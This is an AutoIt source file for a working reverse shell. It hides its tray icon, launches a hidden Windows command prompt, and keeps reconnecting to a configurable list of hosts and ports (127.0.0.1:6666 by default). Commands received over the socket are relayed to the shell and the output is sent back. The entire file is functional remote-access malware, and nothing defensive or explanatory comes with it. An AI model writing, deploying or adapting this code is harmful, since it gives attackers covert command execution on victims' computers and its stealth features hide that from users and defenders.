#include <AutoItConstants.au3>
#include <String.au3>

Opt("TrayIconHide", 1)

$pid = Run(@ComSpec, "", @SW_HIDE, $STDERR_MERGED + $STDIN_CHILD)
Sleep(1000)

TCPStartup()

;insert more host here
Global $host_list[1] = ["127.0.0.1"]
Global $port_list[1] = [6666]
;

Func send_cmd($pid, $cmd)
	StdinWrite($pid, $cmd & @CRLF)
EndFunc

;https://www.autoitscript.com/forum/topic/119997-stdout-read-from-cmdexe-being-cut-short/ ugly but working
Func read_stdout($iPID)
    Local $output = "", $STD_read = "", $S_Counter = 0
    While 1
        Sleep(10)
        $STD_read = StdoutRead($iPID)
        If $STD_read = "" Then
            $S_Counter += 1
        Else
            $output &=$STD_read
        EndIf
        If $S_Counter > 5 Then ExitLoop
    WEnd
    Return $output
EndFunc

Func connect_back()
	For $i = 0 To UBound($host_list) - 1
		$s = TCPConnect($host_list[$i], $port_list[$i])
		If not @error Then ExitLoop
	Next
	Return $s
EndFunc

Func socket_readline($sock)
	$data = ""
	While True
		$c = TCPRecv($sock, 1)
		if @error Then Return -1
		if $c == _HexToString("0a") Then ExitLoop
		$data &= $c
	WEnd
	Return $data
EndFunc

;Main loop
While True
	Do
		$s = connect_back()
	Until $s <> -1
	TCPSend($s, "[Welcome]" & @CRLF)

	While True
		$cmd = socket_readline($s)
		if $cmd == -1 Then ExitLoop
		send_cmd($pid, $cmd)
		TCPSend($s, read_stdout($pid))
	WEnd
	Sleep(500)
WEnd